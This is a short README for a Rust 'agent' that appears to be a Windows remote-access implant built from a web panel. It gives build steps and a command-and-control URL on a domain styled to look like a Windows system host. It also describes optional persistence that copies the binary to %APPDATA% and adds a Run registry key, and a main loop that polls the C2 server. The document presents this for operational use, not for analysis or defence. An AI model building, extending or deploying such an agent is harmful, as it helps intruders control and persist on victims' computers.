# Veltrix Rust Agent

## Build

```bash
cargo build --release
```

The compiled binary is at `target/release/veltrix-agent.exe`.

## Configuration

The builder in the Veltrix panel generates a customized `main.rs` with:
- **C2 URL**: `https://windowssys.hidenmc.com/<userId>`
- **User ID**: auto-detected from your panel session
- **Startup persistence**: optional, copies to `%APPDATA%` and adds a Run key
- **Debug mode**: when enabled, prints verbose output to console

## Structure

```
rustagent/
├── Cargo.toml
├── src/
│   ├── main.rs          # Entry point, C2 loop
│   └── persistence.rs   # Startup persistence module
└── README.md
```
